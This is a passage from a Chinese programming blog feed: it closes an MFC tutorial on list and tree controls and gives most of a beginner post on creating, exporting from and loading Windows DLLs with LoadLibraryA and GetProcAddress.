class="number">0</span>, <span class="number">1</span>, _T(<span class="string">&quot;192.168.0.1&quot;</span>));</span><br><span class="line">m_list.<span class="built_in">SetItemText</span>(<span class="number">0</span>, <span class="number">2</span>, _T(<span class="string">&quot;6648964896486480&quot;</span>));</span><br><span class="line">m_list.<span class="built_in">SetItemText</span>(<span class="number">0</span>, <span class="number">3</span>, _T(<span class="string">&quot;999&quot;</span>));</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/116.png" class=""><p>虽然能设置，但是总归是麻烦了一点。</p><p>另外背景颜色。。额没这个本事，用参数调得不得行</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m_list.<span class="built_in">SetBkColor</span>(<span class="built_in">RGB</span>(<span class="number">64</span>, <span class="number">255</span>, <span class="number">128</span>));</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/117.png" class=""><p>哈哈哈瞎调的，辣眼睛还是注释了先。</p><p>列表比较实用的也可以像多选那样，在初始化的地方给list加个样式</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extStyle |= LVS_EX_CHECKBOXES;</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/118.png" class=""><p>可以看到多了多选框</p><p>那么首先要拖个按钮测试选中之后拉取数据</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCButtonDlg::OnBnClickedBtnList</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="type">int</span> lineCount = m_list.<span class="built_in">GetItemCount</span>();</span><br><span class="line">CHeaderCtrl* pHeader = m_list.<span class="built_in">GetHeaderCtrl</span>();</span><br><span class="line"><span class="type">int</span> coloumnCount = pHeader-&gt;<span class="built_in">GetItemCount</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; lineCount; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; coloumnCount; j++) &#123;</span><br><span class="line">CString temp = m_list.<span class="built_in">GetItemText</span>(i, j);</span><br><span class="line"><span class="type">char</span> Text[MAX_PATH];</span><br><span class="line"><span class="built_in">memset</span>(Text, <span class="number">0</span>, <span class="built_in">sizeof</span>(Text));</span><br><span class="line"><span class="type">size_t</span> total;</span><br><span class="line"><span class="built_in">wcstombs_s</span>(&amp;total, Text, <span class="built_in">sizeof</span>(Text), temp, temp.<span class="built_in">GetLength</span>());</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d): %s %s\n&quot;</span>, __FILE__, __LINE__, __FUNCTION__, Text);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/119.png" class=""><p>可以看到日志输出了我们所选的行的数据。</p><p>如何把多选框和数据关联<br>显然就是判断</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCButtonDlg::OnBnClickedBtnList</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="type">int</span> lineCount = m_list.<span class="built_in">GetItemCount</span>();</span><br><span class="line">CHeaderCtrl* pHeader = m_list.<span class="built_in">GetHeaderCtrl</span>();</span><br><span class="line"><span class="type">int</span> coloumnCount = pHeader-&gt;<span class="built_in">GetItemCount</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; lineCount; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (m_list.<span class="built_in">GetCheck</span>(i)) &#123;</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d): %s %s\n&quot;</span>, __FILE__, __LINE__, __FUNCTION__, <span class="string">&quot;选中&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d): %s %s\n&quot;</span>, __FILE__, __LINE__, __FUNCTION__, <span class="string">&quot;未选中&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; coloumnCount; j++) &#123;</span><br><span class="line">CString temp = m_list.<span class="built_in">GetItemText</span>(i, j);</span><br><span class="line"><span class="type">char</span> Text[MAX_PATH];</span><br><span class="line"><span class="built_in">memset</span>(Text, <span class="number">0</span>, <span class="built_in">sizeof</span>(Text));</span><br><span class="line"><span class="type">size_t</span> total;</span><br><span class="line"><span class="built_in">wcstombs_s</span>(&amp;total, Text, <span class="built_in">sizeof</span>(Text), temp, temp.<span class="built_in">GetLength</span>());</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d): %s %s\n&quot;</span>, __FILE__, __LINE__, __FUNCTION__, Text);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/120.png" class=""><p>虽然有点简陋。</p><p>关于list的style <code>LVS_EX_</code>还有很多不怎么用的，不过一般也是重写<br>还有些set的方法可以搜一搜看看。</p><hr><h3 id="Tree"><a href="#Tree" class="headerlink" title="Tree"></a>Tree</h3><img src="/2022/07/25/mfc01/121.png" class=""><p>拖个tree control出来，然后添加个变量<br>且预览效果跟这样差不多，那我们肯定要自己初始化他</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Tree</span></span><br><span class="line">HTREEITEM hRoot = m_tree.<span class="built_in">InsertItem</span>(_T(<span class="string">&quot;root&quot;</span>));</span><br><span class="line">HTREEITEM hLeaf1 = m_tree.<span class="built_in">InsertItem</span>(_T(<span class="string">&quot;leaf&quot;</span>), hRoot);</span><br><span class="line">m_tree.<span class="built_in">InsertItem</span>(_T(<span class="string">&quot;sub&quot;</span>), hLeaf1);</span><br><span class="line">HTREEITEM hLeaf2 = m_tree.<span class="built_in">InsertItem</span>(_T(<span class="string">&quot;leaf&quot;</span>), hRoot);</span><br><span class="line">m_tree.<span class="built_in">InsertItem</span>(_T(<span class="string">&quot;sub&quot;</span>), hLeaf2);</span><br></pre></td></tr></table></figure><p>根 叶 子叶</p><img src="/2022/07/25/mfc01/122.png" class=""><p>这是全部展开的样子，默认只有root，双击之后一个个展开。光秃秃的很潦草。</p><p>图标自己画问题不大，右击项目打开所在路径，找到res文件夹，在里面添加个位图</p><img src="/2022/07/25/mfc01/123.png" class=""><p>这是画完的样子。<br>然后导入资源。</p><p><strong>搞这种位图呢，主要是应对需要挺多logo之类简单的图片，文件太散找的麻烦，在一张上做分界标记会更好</strong></p><img src="/2022/07/25/mfc01/124.png" class=""><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//头文件声明</span></span><br><span class="line">CImageList m_icons;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//源文件初始化</span></span><br><span class="line">m_icons.<span class="built_in">Create</span>(IDB_TREE, <span class="number">32</span>, <span class="number">3</span>, <span class="number">0</span>);</span><br><span class="line">m_tree.<span class="built_in">SetImageList</span>(&amp;m_icons, TVSIL_NORMAL);</span><br><span class="line"><span class="comment">//Tree</span></span><br><span class="line">HTREEITEM hRoot = m_tree.<span class="built_in">InsertItem</span>(_T(<span class="string">&quot;root&quot;</span>), <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">HTREEITEM hLeaf1 = m_tree.<span class="built_in">InsertItem</span>(_T(<span class="string">&quot;leaf&quot;</span>), <span class="number">2</span>, <span class="number">1</span>, hRoot);</span><br><span class="line">m_tree.<span class="built_in">InsertItem</span>(_T(<span class="string">&quot;sub&quot;</span>), <span class="number">2</span>, <span class="number">1</span>, hLeaf1);</span><br><span class="line">HTREEITEM hLeaf2 = m_tree.<span class="built_in">InsertItem</span>(_T(<span class="string">&quot;leaf&quot;</span>), <span class="number">2</span>, <span class="number">1</span>, hRoot);</span><br><span class="line">m_tree.<span class="built_in">InsertItem</span>(_T(<span class="string">&quot;sub&quot;</span>), <span class="number">2</span>, <span class="number">1</span>, hLeaf2);</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/125.png" class=""><p>哈哈图片画少了，他一个节点两个状态可以用两个图片的，选中和未选中两个样，但是我们用的2和1，所以效果就比较糙。</p><img src="/2022/07/25/mfc01/126.png" class=""><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCButtonDlg::OnNMDblclkTree</span><span class="params">(NMHDR* pNMHDR, LRESULT* pResult)</span> </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">UINT nCount = m_tree.<span class="built_in">GetSelectedCount</span>();</span><br><span class="line"><span class="keyword">if</span> (nCount &gt; <span class="number">0</span>) &#123;</span><br><span class="line">HTREEITEM hSelect = m_tree.<span class="built_in">GetSelectedItem</span>();</span><br><span class="line">CString strText = m_tree.<span class="built_in">GetItemText</span>(hSelect);</span><br><span class="line"><span class="type">char</span> sText[<span class="number">256</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="type">size_t</span> total;</span><br><span class="line"><span class="built_in">wcstombs_s</span>(&amp;total, sText, <span class="built_in">sizeof</span>(sText), strText, strText.<span class="built_in">GetLength</span>());</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d): %s %s\n&quot;</span>, __FILE__, __LINE__, __FUNCTION__, sText);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*pResult = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/127.png" class=""><p>其实做法有很多，大多例子都是颗糖。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>MFC看下来跟去年Qt一个感觉吧，知道拖控件和消息之类的，但是实战太少，经验不足，有的时候很难主动把这些关联起来。</p><p>至于Qt后面也要重新捯饬捯饬。</p>]]></content>
      
      
      
        <tags>
            
            <tag> MFC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态链接库</title>
      <link href="/2022/07/25/dynamiclink/"/>
      <url>/2022/07/25/dynamiclink/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>动态链接库（Dynamic Link Library 或者 Dynamic-link Library，缩写为 DLL），是微软公司在微软Windows操作系统中，实现共享函数库概念的一种方式。这些库函数的扩展名是 ”.dll”、”.ocx”（包含ActiveX控制的库）或者 “.drv”（旧式的系统驱动程序）。<br>——百度百科</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>与之对应的在基础那会学过静态链接库<code>.lib</code>，要使用特定的功能，就必须加载这个静态库，这样在编译的时候其实exe就包含了这个lib。<br>而现在的动态链接库，他只管调用，不去负责连接的过程，要么你写好了不用，他不发生连接，要么写了要用的时候才会去连接。</p><p>静态库编译完成后，已经和exe合并，所以这个exe会比较大。<br>动态库在内存中连接，并没有本质上的合并，相对而言exe比较小，但是计算机如果缺失这个动态库，那么这个exe基本就废了。</p><p>windows常见的动态库(.dll)</p><ol><li>gdi32.dll    绘图</li><li>user32.dll   用户界面有关的函数</li><li>kernel32.dll 内存、线程、进程</li><li>d3d9x_11.dll 绘图</li></ol><p>动态链接库的意义</p><ul><li>模块化</li><li>方便更新迭代</li><li>提高共享率和利用率</li><li>节约内存</li><li>本地化支持</li><li>跨语言编程</li><li>解决版本问题</li><li>等等诸如此类</li></ul><p>歪瓜的事说不得。能做到动态库的瓜也不是一般人了。</p><p>动态库的问题</p><ul><li>因为动态链接，需要时间</li><li>找不到动态库，exe没法跑</li><li>因为更新而导致接口或者参数不一样了，那么以前的代码全废了</li></ul><hr><h2 id="创建动态库"><a href="#创建动态库" class="headerlink" title="创建动态库"></a>创建动态库</h2><img src="/2022/07/25/dynamiclink/000.png" class=""><img src="/2022/07/25/dynamiclink/001.png" class=""><p>vs有模板，直接创建动态链接库的项目就行了。<br>当然是因为第一次，后面自己想怎么来也无所谓。</p><p>其中pch.h 和 pch.cpp是用来预编译的。核心文件自然就是dllmain.cpp。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">   DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">   LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (ul_reason_for_call)&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>dllmain就是这个程序的主入口。</p><p>我们自定义一个函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//前缀试了让编译器导出这个函数 _d</span></span><br><span class="line"><span class="comment">//由于是c++环境，编译的函数，因为有重载，所以会带有很多参数</span></span><br><span class="line"><span class="comment">//我们可以让他用c语言风格编译</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function"><span class="type">int</span> <span class="title">Ave</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实要考虑东西比较多。<br>如果定义这块写成这样很麻烦，可以新建一个头文件，把声明写好，这样定义写起来至少看着正常点。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function"><span class="type">int</span> <span class="title">Ave</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>;</span><br></pre></td></tr></table></figure><p>不过实际用途上，这个头文件还是为了让用你的库的人用的。</p><p>还有一种解决办法</p><img src="/2022/07/25/dynamiclink/002.png" class=""><p>模块化文件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LIBRARY</span><br><span class="line"></span><br><span class="line">EXPORTS</span><br><span class="line">ave</span><br></pre></td></tr></table></figure><p>这么写之后，就不用头文件了。</p><p>上述情况中，我们先忽视了c++的函数重载。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">ave</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">ave</span><span class="params">(<span class="type">int</span> a)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a + a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有一种解决办法就是提前给链接器做好准备<br><code>#pragma comment(linker,&quot;/export:ave=?ave@@YAHHH@Z&quot;)</code><br>只不过这种写法还不如模块化文件，而且不确定会不会有问题</p><p>还有一种比较麻烦的就是还带了函数调用约定</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1为调用风格   2为导出   3为调用约定</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function"><span class="type">int</span> _stdcall <span class="title">ave</span><span class="params">(<span class="type">int</span> a)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a + a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_stdcall在windows api中倒是常见。不过函数在编译后就不会是单纯ave了。<br>要指定的话<code>#pragma comment(linker,&quot;/export:ave=_ave@4&quot;)</code><br>当然显得也有些奇怪</p><img src="/2022/07/25/dynamiclink/003.png" class=""><p>模块化文件之所以能够直接用，其实编译器做了处理的</p><p>简单回顾几种</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/export:ave=_ave@4&quot;</span>)</span></span><br><span class="line"><span class="comment">//.....</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">ave_1</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="type">int</span> _stdcall <span class="title">ave</span><span class="params">(<span class="type">int</span> a)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a + a;</span><br><span class="line">&#125;</span><br><span class="line">_declspec(dllexport) <span class="function"><span class="type">int</span> _stdcall <span class="title">ave_2</span><span class="params">(<span class="type">int</span> a)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + a) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//模块化文件</span></span><br><span class="line">LIBRARY</span><br><span class="line"></span><br><span class="line">EXPORTS</span><br><span class="line">ave_1</span><br></pre></td></tr></table></figure><p>因为懒得下拆解dll函数的软件，就纯yy了。</p><p>一种通过链接器提前导，一种在代码里导出，一种就是模块化文件导出</p><blockquote><p>dll除了导出函数，还能导出变量</p></blockquote><hr><h2 id="链接动态库"><a href="#链接动态库" class="headerlink" title="链接动态库"></a>链接动态库</h2><p>首先新建项目，这会空项目问题不大，然后可以放到一个解决方案下。</p><p>右击新建的项目，找到生成项目依赖项，选择</p><img src="/2022/07/25/dynamiclink/004.png" class=""><p>打上勾。</p><p>然后新建项目里自然要去调用了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//加载dll</span></span><br><span class="line">HMODULE hMod = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;myDll.dll&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (hMod)&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;模块加载成功!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注：此处loaddll的时候，只写了文件名是因为两个项目在一个解决方案里面，所以生成的exe和dll也在一个文件夹，就不用这么麻烦写路径</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//加载dll</span></span><br><span class="line">HMODULE hMod = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;myDll.dll&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (hMod)&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;模块加载成功!\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">FARPROC func = <span class="built_in">GetProcAddress</span>(hMod, <span class="string">&quot;ave_1&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (func)&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;函数加载成功!\n&quot;</span>;</span><br><span class="line"><span class="built_in">func</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>typedef int (FAR WINAPI *FARPROC)();</code>类似于函数指针。</p><img src="/2022/07/25/dynamiclink/005.png" class=""><p>发现函数输出乱值，其实也不难猜到，因为没有输入参数，但是它又不报错。</p><p>这种情况不报错其实不太好，那么FARPROC是函数指针，我们也可以自己定义一个</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*FAVE_1)</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>;</span><br></pre></td></tr></table></figure><img src="/2022/07/25/dynamiclink/006.png" class=""><p>这样他就会提示要输入参数了。</p><p>然后随便输入俩</p><img src="/2022/07/25/dynamiclink/007.png" class=""><p>这样就成功了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*FAVE_1)</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//加载dll</span></span><br><span class="line">HMODULE hMod = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;myDll.dll&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (hMod)&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;模块加载成功!\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">FAVE_1 func = (FAVE_1)<span class="built_in">GetProcAddress</span>(hMod, <span class="string">&quot;ave_1&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (func)&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;函数加载成功!\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">func</span>(<span class="number">200</span>,<span class="number">300</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>HMODULE hMod = LoadLibraryA(&quot;myDll.dll&quot;);</code>这一步就是程序跑的时候，把这个库加载到程序的内存中。</p><p><code>FAVE_1 func = (FAVE_1)GetProcAddress(hMod, &quot;ave_1&quot;);</code>这一步是为了把函数的地址取出来，用了自定义类型是因为原本的类型不符合我们的需求。<strong>同时要注意，如果dll没有导出这个函数，那么根据这个函数名是找不到的</strong></p><p>如果不想用这个dll了，就可以使用<code>FreeLibrary(hMod);</code></p><p>再往后，如果我们想调用这个函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="type">int</span> _stdcall <span class="title">ave</span><span class="params">(<span class="type">int</span> a)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a + a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先肯定要自定义类型了，那么关键在于<code>extern &quot;C&quot;</code>和<code>_stdcall</code>要不要加的问题<br><code>extern &quot;C&quot;</code>其实是告诉编译器怎么编译它，那么编译完之后其实就不用管了。<br>但是<code>_stdcall</code>不一样，函数调用约定比较麻烦。所以<code>_stdcall</code>是必须的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span><span class="params">(_stdcall *FAVE)</span><span class="params">(<span class="type">int</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>模板的形参名是可以省略的，有印象的话最好。<br>至于<code>_stdcall</code>，其实在之前写的线程进程的时候，有用到一个宏<code>WINAPI</code>，它本质上就是<code>_stdcall</code>。<br>所以这么写也没问题<code>typedef int(WINAPI *FAVE)(int);</code></p><img 